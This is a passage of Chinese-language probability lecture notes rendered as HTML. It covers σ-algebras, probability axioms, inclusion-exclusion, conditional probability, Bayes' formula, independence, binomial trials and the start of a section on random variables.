<ul>
<li>包含</li>
<li>相等</li>
<li>并(至少一个发生)</li>
<li>交(同时发生)</li>
<li>差(<span class="arithmatex">\(A\)</span> 差 <span class="arithmatex">\(B\)</span>,<span class="arithmatex">\(A\)</span>发生但<span class="arithmatex">\(B\)</span>不发生<span class="arithmatex">\(A\)</span>差<span class="arithmatex">\(B = A\overline{B}\)</span>)</li>
<li>互不相容($A\cap B = \emptyset $)</li>
<li>互逆事件($A \cap B = \emptyset $ 且 <span class="arithmatex">\(A \cup B = \Omega\)</span>)</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>事件的关系与运算满足集合论中有关集合运算的一切性质(交换律，结合律，分配律，De Morgan律)</p>
</div>
<h3 id="note-probability-first-_10">概率空间<a class="headerlink" href="#note-probability-first-_10" title="Permanent link">&para;</a></h3>
<p>第一个要素为样本空间 <span class="arithmatex">\(\Omega\)</span>，是样本点 <span class="arithmatex">\(\omega\)</span> 的全体，根据问题需要事先取定。</p>
<p>第二个要素为事件域 <span class="arithmatex">\(\mathrm{F}\)</span>，是 <span class="arithmatex">\(\Omega\)</span> 中某些满足下列条件的子集的全体所组成的集类：</p>
<ol>
<li><span class="arithmatex">\(\Omega \in \mathrm{F}\)</span>；</li>
<li>若 <span class="arithmatex">\(A \in \mathcal{F}\)</span>，则 <span class="arithmatex">\(A^c \in \mathcal{F}\)</span>；</li>
<li>若 <span class="arithmatex">\(A_1, A_2, \ldots, A_n, \ldots \in \mathcal{F}\)</span>，则 <span class="arithmatex">\(\bigcup_{n=1}^\infty A_n \in \mathcal{F}\)</span>。</li>
</ol>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>总结为事件域中的运算是封闭的</p>
</div>
<p>满足这三个条件的 <span class="arithmatex">\(\mathcal{F}\)</span> 称为 <span class="arithmatex">\(\Omega\)</span> 上的 <span class="arithmatex">\(\sigma\)</span>-代数或 <span class="arithmatex">\(\sigma\)</span>-域。 <span class="arithmatex">\(\mathcal{F}\)</span> 中的元素（<span class="arithmatex">\(\Omega\)</span> 的子集）称为事件。</p>
<p>由这三个条件，可以推得事件域有下列性质：</p>
<ol>
<li>
<p><span class="arithmatex">\(\emptyset \in \mathcal{F}\)</span> （因 <span class="arithmatex">\(\emptyset = \Omega^c\)</span>）；</p>
</li>
<li>
<p>若 <span class="arithmatex">\(A_1, \ldots, A_n, \ldots \in \mathcal{F}\)</span>，则 <span class="arithmatex">\(\bigcap_{n=1}^\infty A_n \in \mathcal{F}\)</span> （因 <span class="arithmatex">\(\bigcap_{n=1}^\infty A_n = \left( \bigcup_{n=1}^\infty A_n^c \right)^c\)</span>）；</p>
</li>
<li>
<p>若 <span class="arithmatex">\(A_1, \ldots, A_n \in \mathcal{F}\)</span>，则 <span class="arithmatex">\(\bigcup_{k=1}^n A_k \in \mathcal{F}\)</span>，<span class="arithmatex">\(\bigcap_{k=1}^n A_k \in \mathcal{F}\)</span>。</p>
</li>
</ol>
<p>事件域也可以根据问题选择。因为对同一个样本空间 <span class="arithmatex">\(\Omega\)</span>，可以有很多 <span class="arithmatex">\(\sigma\)</span> -代数。例如最简单的是  </p>
<div class="arithmatex">\[
\mathcal{F}_1 = \{ \emptyset, \Omega \}
\]</div>
<p>复杂的如 </p>
<div class="arithmatex">\[
\mathcal{F}_2 = \{ \Omega \text{的一切子集} \}+
\]</div>
<p>也是<span class="arithmatex">\(\sigma\)</span>-代数，所以要适当选择。特别地，若<span class="arithmatex">\(\Omega\)</span>为有限或可列个样本点组成，则常取<span class="arithmatex">\(\Omega\)</span>的一切子集所成的集类作为  </p>
<div class="arithmatex">\[
\mathcal{F}
\]</div>
<p>像在古典概率中那样。不难验证，<span class="arithmatex">\(\mathcal{F}\)</span>是<span class="arithmatex">\(\sigma\)</span>-代数。</p>
<p>若 <span class="arithmatex">\(\Omega = \mathbf{R}\)</span>（一维实数全体），此时常取一切左开右闭有界区间和它们的（有限或可列）并、（有限或可列）交、逆所成的集的全体为<span class="arithmatex">\(\mathcal{F}\)</span>（通常记为<span class="arithmatex">\(\mathcal{B}\)</span>），称为一维波雷尔（Borel）<span class="arithmatex">\(\sigma\)</span>-代数，其中的集称为一维波雷尔集，它是比全体区间大得多的一个集类。</p>
<p>若<span class="arithmatex">\(\Omega = \mathbf{R}^{n}\)</span>n维实数全体），则常取一切左开右闭有界n维矩形和它们的（有限或可列）并、（有限或可列）交、逆所成的集的全体为<span class="arithmatex">\(\mathcal{F}\)</span>（通常记为<span class="arithmatex">\(\mathcal{B}^n\)</span>），它包含了我们感兴趣的所有情形，称为n维波雷尔<span class="arithmatex">\(\sigma\)</span>-代数。</p>
<p>如果我们对<span class="arithmatex">\(\Omega\)</span>的某个子集类<span class="arithmatex">\(\mathcal{C}\)</span>感兴趣，所选的事件域<span class="arithmatex">\(\mathcal{F}\)</span>可以是包含<span class="arithmatex">\(\mathcal{C}\)</span>的最小<span class="arithmatex">\(\sigma\)</span>-代数，这种<span class="arithmatex">\(\sigma\)</span>-代数是存在的，因为：</p>
<ol>
<li>至少有一个包含<span class="arithmatex">\(\mathcal{C}\)</span>的<span class="arithmatex">\(\sigma\)</span>-代数，即上述<span class="arithmatex">\(\mathcal{F}_2\)</span>；</li>
<li>若有很多包含<span class="arithmatex">\(\mathcal{C}\)</span>的<span class="arithmatex">\(\sigma\)</span>-代数，则它们的交也是<span class="arithmatex">\(\sigma\)</span>-代数，且就是最小的。</li>
</ol>
<p>特别地，如果我们只对<span class="arithmatex">\(\Omega\)</span>的一个子集A感兴趣，则包含A的最小<span class="arithmatex">\(\sigma\)</span>-代数就是  </p>
<div class="arithmatex">\[
\mathcal{F} = \{ \emptyset, A, A^c, \Omega \}.
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>概率是<span class="arithmatex">\(\mathcal{F}\)</span>上的实值集函数 <span class="arithmatex">\(A(\in, \mathcal{F}) \rightarrow P(A)\)</span>,并且满足非负性，规范性，可列可加性三个条件(公理)</p>
</div>
<p>满足这些定义的概率测度 <span class="arithmatex">\(P\)</span> 应满足的基本公式有以下式：</p>
<ul>
<li>
<p><span class="arithmatex">\(P(\emptyset) = 0\)</span>.</p>
</li>
<li>
<p>若 <span class="arithmatex">\(A_i; A_j = \emptyset, \, i, j = 1, 2, \ldots, n, \, i \neq j\)</span>, 则</p>
</li>
</ul>
<div class="arithmatex">\[
P \left( \sum_{i=1}^{n} A_i \right) = \sum_{i=1}^{n} P(A_i).
\]</div>
<ul>
<li>
<p><span class="arithmatex">\(P(A) = 1 - P(A^c)\)</span>.</p>
</li>
<li>
<p>若 <span class="arithmatex">\(B \subseteq A\)</span>, 则 <span class="arithmatex">\(P(A - B) = P(A) - P(B)\)</span>.</p>
</li>
<li>
<p><span class="arithmatex">\(P(A \cup B) = P(A) + P(B) - P(AB)\)</span>.</p>
</li>
<li>
<p><span class="arithmatex">\(P(A \backslash  B)=P(A) - P(AB)\)</span></p>
</li>
<li>
<p>(多还少补定理，容斥原理)</p>
</li>
</ul>
<div class="arithmatex">\[
P(A_1 \cup A_2 \cup \ldots \cup A_n) = \sum_{i=1}^{n} P(A_i) - \sum_{1 \leqslant i &lt; j \leqslant n} P(A_i A_j) + \ldots + (-1)^{n-1} P(A_1 A_2 \ldots A_n).
\]</div>
<div class="admonition proof">
<p class="admonition-title">证明-数学归纳法</p>
</div>
<div class="arithmatex">\[
P(A_1 \cup A_2 \cup \ldots \cup A_n) = \sum_{i=1}^{n} P(A_i) - \sum_{1 \leqslant i &lt; j \leqslant n} P(A_i A_j) + \ldots + (-1)^{n-1} P(A_1 A_2 \ldots A_n)
\]</div>
<ul>
<li>验证基例 <span class="arithmatex">\(n = 1\)</span>
当 <span class="arithmatex">\(n = 1\)</span> 时，定理变为：</li>
</ul>
<div class="arithmatex">\[
P(A_1) = P(A_1)
\]</div>
<p>显然这是正确的，所以基例成立。</p>
<ul>
<li>归纳假设
假设对于 <span class="arithmatex">\(n = k\)</span> 时，定理成立，即：</li>
</ul>
<div class="arithmatex">\[
P(A_1 \cup A_2 \cup \ldots \cup A_k) = \sum_{i=1}^{k} P(A_i) - \sum_{1 \leqslant i &lt; j \leqslant k} P(A_i A_j) + \ldots + (-1)^{k-1} P(A_1 A_2 \ldots A_k)
\]</div>
<ul>
<li>证明 <span class="arithmatex">\(n = k+1\)</span> 时的情形
现在我们需要证明，当有 <span class="arithmatex">\(k+1\)</span> 个事件 <span class="arithmatex">\(A_1, A_2, \ldots, A_{k+1}\)</span> 时，定理同样成立。</li>
</ul>
<p>首先考虑 <span class="arithmatex">\(P(A_1 \cup A_2 \cup \ldots \cup A_{k+1})\)</span>：</p>
<div class="arithmatex">\[
P(A_1 \cup A_2 \cup \ldots \cup A_{k+1}) = P((A_1 \cup A_2 \cup \ldots \cup A_k) \cup A_{k+1})
\]</div>
<p>利用概率的加法原理，有：</p>
<div class="arithmatex">\[
P((A_1 \cup A_2 \cup \ldots \cup A_k) \cup A_{k+1}) = P(A_1 \cup A_2 \cup \ldots \cup A_k) + P(A_{k+1}) - P((A_1 \cup A_2 \cup \ldots \cup A_k) A_{k+1})
\]</div>
<p>根据归纳假设，<span class="arithmatex">\(P(A_1 \cup A_2 \cup \ldots \cup A_k)\)</span> 可以展开为：</p>
<div class="arithmatex">\[
P(A_1 \cup A_2 \cup \ldots \cup A_k) = \sum_{i=1}^{k} P(A_i) - \sum_{1 \leqslant i &lt; j \leqslant k} P(A_i A_j) + \ldots + (-1)^{k-1} P(A_1 A_2 \ldots A_k)
\]</div>
<p>因此，原式变为：</p>
<div class="arithmatex">\[
P(A_1 \cup A_2 \cup \ldots \cup A_{k+1}) = 
\\ \left(\sum_{i=1}^{k} P(A_i) - \sum_{1 \leqslant i &lt; j \leqslant k} P(A_i A_j) + \ldots + (-1)^{k-1} P(A_1 A_2 \ldots A_k)\right)
+ P(A_{k+1}) - P((A_1 \cup A_2 \cup \ldots \cup A_k) A_{k+1})
\]</div>
<p>注意，<span class="arithmatex">\(P((A_1 \cup A_2 \cup \ldots \cup A_k) A_{k+1})\)</span> 可以展开为：</p>
<div class="arithmatex">\[
P((A_1 \cup A_2 \cup \ldots \cup A_k) A_{k+1}) = \sum_{i=1}^{k} P(A_i A_{k+1}) - \sum_{1 \leqslant i &lt; j \leqslant k} P(A_i A_j A_{k+1}) + \ldots + (-1)^{k-1} P(A_1 A_2 \ldots A_k A_{k+1})
\]</div>
<p>将其代入之前的公式中，得到：</p>
<div class="arithmatex">\[
P(A_1 \cup A_2 \cup \ldots \cup A_{k+1}) = \sum_{i=1}^{k+1} P(A_i) - \sum_{1 \leqslant i &lt; j \leqslant k+1} P(A_i A_j) + \ldots + (-1)^{k} P(A_1 A_2 \ldots A_{k+1})
\]</div>
<p>这正是我们需要证明的 <span class="arithmatex">\(n = k+1\)</span> 的情形。</p>
<ul>
<li>(次可加性)</li>
</ul>
<div class="arithmatex">\[
P(A_1 \cup A_2 \cup \ldots \cup A_n) \leqslant \sum_{i=1}^{n} P(A_i). 
\]</div>
<h3 id="note-probability-first-_11">概率测度的连续性<a class="headerlink" href="#note-probability-first-_11" title="Permanent link">&para;</a></h3>
<p>给定一概率空间 <span class="arithmatex">\((\Omega, \mathcal{F}, P)\)</span>，假设 <span class="arithmatex">\(A_1, A_2, \ldots\)</span> 是一列单调增加的事件序列，即</p>
<div class="arithmatex">\[
A_1 \subset A_2 \subset \cdots \subset A_n \subset \cdots
\]</div>
<p>记 <span class="arithmatex">\(A = \bigcup_{n=1}^{\infty} A_n\)</span>，称 <span class="arithmatex">\(A\)</span> 为 <span class="arithmatex">\(A_n\)</span> 的极限。从公理化定义可以看出，<span class="arithmatex">\(A\)</span> 仍然是一个事件。下面定理给出该事件的概率大小。</p>
<p>如果 <span class="arithmatex">\(A_1, A_2, \ldots\)</span> 是一列单调增加的事件序列，具有极限 <span class="arithmatex">\(A\)</span>，那么，</p>
<div class="arithmatex">\[
P(A) = \lim_{n \to \infty} P(A_n) .
\]</div>
<h3 id="note-probability-first-_12">事件的上极限和下极限<a class="headerlink" href="#note-probability-first-_12" title="Permanent link">&para;</a></h3>
<p>事件是样本点的集合，事件的上级限和下极限是事件的集合的极限。</p>
<p>对于一个集合序列，我们定义其上极限和下极限如下：</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>设 <span class="arithmatex">\(\{ A_n \}_{n=1}^{\infty}\)</span> 是一列事件序列，定义</p>
<div class="arithmatex">\[
\limsup_{n \to \infty} A_n = \bigcap_{n=1}^{\infty} \bigcup_{k=n}^{\infty} A_k
\]</div>
<p>为事件 <span class="arithmatex">\(A_n\)</span> 的上极限，而</p>
<div class="arithmatex">\[
\liminf_{n \to \infty} A_n = \bigcup_{n=1}^{\infty} \bigcap_{k=n}^{\infty} A_k
\]</div>
<p>为事件 <span class="arithmatex">\(A_n\)</span> 的下极限。</p>
<p>其实理解起来也是不困难的，对于上极限</p>
<p>可以设<span class="arithmatex">\(B_n=\bigcup_{k=n}^{\infty} A_k\)</span>，则<span class="arithmatex">\(B_1\supset B_2 \supset \cdots\)</span>，即<span class="arithmatex">\(B_n\)</span>是单调递减的(因为参与并的集合越来越少了)，我们取这个单调递减的序列的交(也就相当于取极限,从最大的开始不断剔除里面多余的元素)，就是上极限</p>
<p>而对于下极限，我们可以设<span class="arithmatex">\(C_n=\bigcap_{k=n}^{\infty} A_k\)</span>，则<span class="arithmatex">\(C_1\subset C_2 \subset \cdots\)</span>，即<span class="arithmatex">\(C_n\)</span>是单调递增的(因为参与交的集合越来越少了)，我们取这个单调递增的序列的并(也就相当于取极限,从最小的开始不断添加里面缺失的元素)，就是下极限</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="arithmatex">\[\begin{align*}
   A_1 &amp;=\{1,2,3\} \\
   A_2 &amp;=\{2,3,4\} \\
   A_3 &amp;=\{3,4\} \\
   A_4 &amp;=\{2，4\} \\
   A_k &amp;=\{2,3,4\} 或者 \{3,4\} 或者 \{2,4\} \enspace k \geqslant 4 \\
\end{align*}\]</div>
<p>则有</p>
<p>上极限：<span class="arithmatex">\(\limsup_{n \to \infty} A_n = \{2,3,4\}\)</span></p>
<p>下极限：<span class="arithmatex">\(\liminf_{n \to \infty} A_n = \{4\}\)</span></p>
</div>
<h2 id="note-probability-first-_13">条件概率和链式法则<a class="headerlink" href="#note-probability-first-_13" title="Permanent link">&para;</a></h2>
<div class="admonition info">
<p class="admonition-title">条件概率 <span class="arithmatex">\(P(A|B)\)</span></p>
<p>事件 <span class="arithmatex">\(B\)</span> 发生条件下事件 <span class="arithmatex">\(A\)</span> 发生的概率，称为事件 <span class="arithmatex">\(A\)</span> 关于事件 <span class="arithmatex">\(B\)</span> 的 <strong>条件概率 (conditional probability)</strong> </p>
</div>
<p>有基本公式:</p>
<div class="arithmatex">\[
    P(A|B)=\frac{P(AB)}{P(B)}
\]</div>
<p>也可以表示为 <strong>链式法则(乘法公式)</strong> 的形式：</p>
<div class="arithmatex">\[
    P(AB)=P(A|B)P(B)
\]</div>
<details class="general">
<summary>推广到 <span class="arithmatex">\(n\)</span> 个事件</summary>
<p>推广到 <span class="arithmatex">\(n\)</span> 个事件，有链式法则：</p>
<div class="arithmatex">\[
    P\left(\prod_{i=i}^nA_i\right)=\prod_{i=1}^n P\left(A_i\bigg|\prod_{j=1}^{i-1}A_j\right)
\]</div>
<p>特别定义 <span class="arithmatex">\(a&gt;b\)</span> 时，<span class="arithmatex">\(\prod_{i=a}^bA_i\)</span> 为必然事件。</p>
<div class="arithmatex">\[
    P\left(A_{1} A_{2} \cdots A_{n}\right) =
    P\left(A_{1}\right) \cdot P\left(A_{2} \mid A_{1}\right) \cdot P\left(A_{3} \mid A_{1} A_{2}\right) \cdots P\left(A_{n} \mid A_{1} A_{2} \cdots A_{n-1}\right)
\]</div>
</details>
<h2 id="note-probability-first-_14">全概率公式<a class="headerlink" href="#note-probability-first-_14" title="Permanent link">&para;</a></h2>
<div class="admonition info">
<p class="admonition-title">分割(完备事件组)</p>
<p>在概率空间 (<span class="arithmatex">\(\Omega, \mathcal{F}, P\)</span>) 中，若事件 <span class="arithmatex">\(\{A_1, A_2, \cdots, A_n\}\)</span>(<span class="arithmatex">\(n&lt;\infty\)</span> 或 <span class="arithmatex">\(n=\infty\)</span>) 满足：</p>
<ol>
<li><span class="arithmatex">\(A_i\)</span> 两两互不相容(不可能同时发生)，且 <span class="arithmatex">\(P(A_i)&gt;0\)</span></li>
<li>
<div class="arithmatex">\[\sum_{i=1}^\infty A_i=\Omega\]</div>
</li>
</ol>
<p>则称 <span class="arithmatex">\(\{A_1, A_2, \cdots, A_n\}\)</span> 构成 <span class="arithmatex">\(\Omega\)</span> 的一个 <strong>分割(完备事件组)</strong></p>
</div>
<div class="admonition abstract">
<p class="admonition-title">全概率 (total probability) 公式</p>
<p>在概率空间 (<span class="arithmatex">\(\Omega, \mathcal{F}, P\)</span>) 中，若 <span class="arithmatex">\(\{A_1, A_2, \cdots, A_n\}\)</span>(<span class="arithmatex">\(n&lt;\infty\)</span> 或 <span class="arithmatex">\(n=\infty\)</span>) 构成 <span class="arithmatex">\(\Omega\)</span> 的一个 <strong>分割(完备事件组)</strong> ，</p>
<p>则有 <strong>全概率公式</strong> 成立：<span class="arithmatex">\(\forall B\in \mathcal{F}\)</span>，有</p>
<div class="arithmatex">\[
    P(B)=\sum_{i=1}^nP(A_i)P(B|A_i)
\]</div>
</div>
<details class="proof">
<summary>Proof</summary>
<div class="arithmatex">\[
\begin{aligned}
    P(B)&amp;=P(B\Omega)\\
    &amp;=P\left(B\sum_{i=1}^nA_i\right)\\
    &amp;=P\left(\sum_{i=1}^nBA_i\right)\\
    &amp;=\sum_{i=1}^nP(BA_i)\\
    &amp;=\sum_{i=1}^nP(A_i)P(B|A_i)
\end{aligned}
\]</div>
</details>
<h2 id="note-probability-first-_15">贝叶斯公式<a class="headerlink" href="#note-probability-first-_15" title="Permanent link">&para;</a></h2>
<div class="admonition abstract">
<p class="admonition-title">贝叶斯 (Bayes) 公式</p>
<div class="arithmatex">\[
P(A_i|B)=\dfrac{P(A_i)P(B|A_i)}
{\sum_{k=1}^\infty P(A_k)P(B|A_k)}
\]</div>
</div>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p><span class="arithmatex">\(P(A_i|B)=\dfrac{P(A_iB)}{P(B)}\)</span>，分子用链式法则展开，分母用全概率公式展开。</p>
</div>
<div class="admonition tip">
<p class="admonition-title">深入了解条件概率的意义</p>
<p><span class="arithmatex">\(P(A_i)\)</span>：不知 <span class="arithmatex">\(B\)</span> 是否发生，称为 <strong>先验 (priori) 概率</strong></p>
<p><span class="arithmatex">\(P(A_i|B)\)</span>：以 <span class="arithmatex">\(B\)</span> 发生为已知条件，称为 <strong>后验 (posteriori) 概率</strong></p>
</div>
<h2 id="note-probability-first-_16">事件独立性<a class="headerlink" href="#note-probability-first-_16" title="Permanent link">&para;</a></h2>
<h3 id="note-probability-first-_17">两个事件的独立性<a class="headerlink" href="#note-probability-first-_17" title="Permanent link">&para;</a></h3>
<div class="admonition info">
<p class="admonition-title"><span class="arithmatex">\(A\)</span> 与 <span class="arithmatex">\(B\)</span> 相互独立(统计独立)</p>
<p>称事件 <span class="arithmatex">\(A\)</span> 与事件 <span class="arithmatex">\(B\)</span> <strong>相互独立(统计独立，statistical independence)</strong>，如果满足</p>
<div class="arithmatex">\[
    P(AB)=P(A)\cdot P(B)
\]</div>
</div>
<p>因为此时有</p>
<div class="arithmatex">\[
    P(A|B)=\frac{P(AB)}{P(B)}=P(A)
\]</div>
<p>且</p>
<div class="arithmatex">\[
    P(B|A)=\frac{P(AB)}{P(A)}=P(B)
\]</div>
<p>如果 <span class="arithmatex">\(A\)</span> 与 <span class="arithmatex">\(B\)</span> 不相互独立，也称为 <strong>统计相依 (statistical dependence)</strong></p>
<h3 id="note-probability-first-_18">多个事件的独立性<a class="headerlink" href="#note-probability-first-_18" title="Permanent link">&para;</a></h3>
<p>对于一组事件 <span class="arithmatex">\(A_1,A_2,\cdots,A_n\)</span>，存在两两独立和整体的相互独立两种概念。</p>
<p>不妨先以三个事件 <span class="arithmatex">\(A,B,C\)</span> 为例进行研究。</p>
<ul>
<li>
<p>两两独立：即 <span class="arithmatex">\(A\)</span> 与 <span class="arithmatex">\(B\)</span> 相互独立，<span class="arithmatex">\(B\)</span> 与 <span class="arithmatex">\(C\)</span> 相互独立，<span class="arithmatex">\(C\)</span> 与 <span class="arithmatex">\(A\)</span> 相互独立</p>
<div class="arithmatex">\[
\left\{\begin{array}{l}
    P(A B)=P(A) \cdot P(B) \\
    P(A C)=P(A) \cdot P(C) \\
    P(B C)=P(B) \cdot P(C)
    \end{array}\right.
\]</div>
<p>但是有可能</p>
<div class="arithmatex">\[
P(ABC) \neq P(A)\cdot P(B)\cdot P(C)
\]</div>
</li>
<li>
<p>整体相互独立：即满足</p>
<div class="arithmatex">\[
P(ABC)=P(A)\cdot P(B)\cdot P(C)
\]</div>
</li>
</ul>
<p>同时满足两两独立和整体的相互独立，才能说 <span class="arithmatex">\(A, B, C\)</span> 相互独立。
且A与BC的并，交，差等也是独立的。</p>
<details class="general">
<summary>推广到 <span class="arithmatex">\(n\)</span> 个事件</summary>
<p>推广到 <span class="arithmatex">\(n\)</span> 个事件，<span class="arithmatex">\(A_1,A_2,\cdots,A_n\)</span> 相互独立需要满足：<span class="arithmatex">\(\forall r&lt;n\)</span>，<span class="arithmatex">\(A_1,A_2,\cdots,A_n\)</span> 中任意 <span class="arithmatex">\(r\)</span> 个事件都相互独立，且</p>
<div class="arithmatex">\[
    P\left(\prod_{i=1}^nA_i\right)=\prod_{i=1}^n P(A_i)
\]</div>
<p>或者可以直接这么定义：<span class="arithmatex">\(A_1,A_2,\cdots,A_n\)</span> 相互独立，如果</p>
<div class="arithmatex">\[\forall r \leqslant n (r\in \mathbf{N_+}),\;
P \left( \prod_{i=1}^r A_{n_i} \right) = \prod_{i=1}^r P(A_{n_i}),\;
1 \leqslant n_1 &lt; n_2 &lt; \cdots &lt;n_r \leqslant n\]</div>
</details>
<h2 id="note-probability-first-_19">伯努利试验<a class="headerlink" href="#note-probability-first-_19" title="Permanent link">&para;</a></h2>
<p>伯努利概型（Bernoulli trial）是概率论中的一个基本概念，它描述了只有两个可能结果的随机试验，通常称为“成功”和“失败”。每次试验都是独立的，并且每次成功的概率都是相同的，记作 <span class="arithmatex">\( p \)</span>，而失败的概率则为 <span class="arithmatex">\( 1-p \)</span>。</p>
<p>伯努利概型的特点包括：</p>
<ol>
<li><strong>只有两个结果</strong>：每次试验的结果只能是成功或失败。</li>
<li><strong>独立性</strong>：每次试验的结果不会影响其他试验。</li>
<li><strong>固定的成功概率</strong>：每次试验中成功的概率 <span class="arithmatex">\( p \)</span> 是不变的。</li>
</ol>
<p>伯努利概型常用于建模各种现实情况，比如抛硬币、调查投票等。在多个伯努利试验的基础上，有二项分布</p>
<p>二项分布(Binomial distribution)是n重伯努利试验成功次数的离散概率分布，记作<span class="arithmatex">\(B(n,p)\)</span>。</p>
<div class="arithmatex">\[
P(X = k) = \binom{n}{k} p^k (1-p)^{n-k}
\]</div>
<p>其中，<span class="arithmatex">\( \binom{n}{k} \)</span> 是组合数，表示从 <span class="arithmatex">\( n \)</span> 次试验中选择 <span class="arithmatex">\( k \)</span> 次成功的方式总数。二项分布适用于描述在 <span class="arithmatex">\( n \)</span> 次独立的伯努利试验中，成功发生的次数。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>一枚硬币抛 10 次，求恰好 3 次正面朝上的概率。</p>
<p>这是一个二项分布问题，其中 <span class="arithmatex">\( n = 10 \)</span>，<span class="arithmatex">\( k = 3 \)</span>，<span class="arithmatex">\( p = 0.5 \)</span>。代入公式，有：</p>
<div class="arithmatex">\[
P(B_3) = \binom{10}{3} \times 0.5^3 \times 0.5^{10-3} = 0.1172.
\]</div>
<p>所以恰好 3 次正面朝上的概率是 0.1172。</p>
</div>
<h2 id="note-probability-first-_20">乘积概率空间<a class="headerlink" href="#note-probability-first-_20" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">乘积概率空间</p>
<p>设有两个概率空间 <span class="arithmatex">\((\Omega_1, \mathcal{F}_1, P_1)\)</span> 和 <span class="arithmatex">\((\Omega_2, \mathcal{F}_2, P_2)\)</span>,对应试验为 <span class="arithmatex">\(E_1\)</span> 和 <span class="arithmatex">\(E_2\)</span>,独立地做两个试验，记录其结果为 <span class="arithmatex">\((\omega_1, \omega_2)\)</span>,则称 <span class="arithmatex">\((\Omega_1 \times \Omega_2, \mathcal{F}_1 \times \mathcal{F}_2, P_1 \times P_2)\)</span> 为 <span class="arithmatex">\((\Omega_1, \mathcal{F}_1, P_1)\)</span> 和 <span class="arithmatex">\((\Omega_2, \mathcal{F}_2, P_2)\)</span> 的 <strong>乘积概率空间</strong>。</p>
<p>其中事件事件 <span class="arithmatex">\(A\)</span></p>
<div class="arithmatex">\[
    A=\{(\omega_1, \omega_2) \mid \omega_1 \in A_1, \omega_2 \in A_2\}
\]</div>
<p>其概率</p>
<div class="arithmatex">\[
    P(A)=P(A_1)P(A_2)
\]</div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>两个试验的乘积概率空间可以在二维平面上表示</p>
</div>
<details class="info">
<summary>Simpson 悖论</summary>
<div class="arithmatex">\[
    ad&gt;bc;eh&gt;fg;\\
    (a+e)(d+h)&lt;(b+f)(c+g)
\]</div>
<p>约束条件为</p>
<div class="arithmatex">\[
    a+b+c+d+e+f+g+h=1\\
    a,b,c,d,e,f,g,h&gt;0
\]</div>
</details></section><section class="print-page" id="note-probability-second" heading-number="2.3.2.3"><h1 id="note-probability-second-_1">随机变量与随机向量<a class="headerlink" href="#note-probability-second-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2495 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 9 分钟</p>
</div>
<h2 id="note-probability-second-_2">随机变量<a class="headerlink" href="#note-probability-second-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-probability-second-_3">随机变量的概念<a class="headerlink" href="#note-probability-second-_3" title="Permanent link">&para;</a></h3>
<div class="admonition info">
<p class="admonition-title">随机变量</p>
<p>定义概率空间 <span class="arithmatex">\((\Omega, \mathcal{F}, P)\)</span> 上的单值实函数 <span class="arithmatex">\(\xi(\omega)\)</span>，即</p>
<div class="arithmatex">\[
\xi: \Omega\to \mathbb R
\]</div>
<p>还要求 <span class="arithmatex">\(\xi(\omega)\)</span> 的任意取值组合对应的样本点集合构成的事件在事件域 <span class="arithmatex">\(\mathcal{F}\)</span> 中，这样就可以称 <span class="arithmatex">\(\xi(\omega)\)</span> 为 <strong>随机变量 (random variable)</strong></p>
<p>即将<span class="arithmatex">\(\xi\)</span>看成一个函数，我们希望它的值域集合<span class="arithmatex">\(A(\in R)\)</span>也满足事件的运算，所以要求它是博雷尔集,落在博雷尔域<span class="arithmatex">\(\mathcal{B}\)</span>中，即从事件域<span class="arithmatex">\(\mathcal{F}\)</span>到事件域的映射，由于原<span class="arithmatex">\(\Omega\)</span>中的样本点映射到了<span class="arithmatex">\(\mathbb R\)</span>中，所以映射之后的事件域称为波列尔域<span class="arithmatex">\(\mathcal{B}\)</span></p>
</div>
<h3 id="note-probability-second-_4">离散型随机变量<a class="headerlink" href="#note-probability-second-_4" title="Permanent link">&para;</a></h3>
<p>离散型随机变量：随机变量 <span class="arithmatex">\(\xi\)</span> 可取的值至多可列个。</p>
<div class="admonition info">
<p class="admonition-title">分布列 (distribution sequence)</p>
<div class="arithmatex">\[
\left[
\begin{matrix}
x_1&amp;x_2&amp;\cdots&amp;x_n&amp;\cdots\\
p(x_1)&amp;p(x_2)&amp;\cdots&amp;p(x_n)&amp;\cdots
\end{matrix}
\right]
\]</div>
</div>
<p>第一行是 <span class="arithmatex">\(\xi\)</span> 可能取的值，第二行是 <span class="arithmatex">\(\xi\)</span> 取这些值的概率。</p>
<div class="admonition abstract">
<p class="admonition-title">分布列的性质</p>
<ul>
<li>正性，即</li>
</ul>
<div class="arithmatex">\[
p(x_i)&gt;0,i=1,2\cdots
\]</div>
<ul>
<li>规范性，即</li>
</ul>
<div class="arithmatex">\[
\sum_{i=1}^\infty p(x_i)=1
\]</div>
</div>
<div class="admonition example">
<p class="admonition-title">Examples</p>
<p>对一些常见离散型随机变量举例如下：</p>
